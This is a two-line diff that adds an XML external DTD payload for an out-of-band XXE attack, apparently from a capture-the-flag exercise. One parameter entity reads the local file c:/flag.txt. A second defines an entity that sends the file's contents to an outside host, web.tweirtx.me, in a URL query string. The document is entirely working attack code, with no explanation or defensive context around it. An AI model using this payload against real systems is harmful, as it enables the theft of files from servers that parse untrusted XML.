@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///c:/flag.txt">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://web.tweirtx.me:80/?%data;'>">
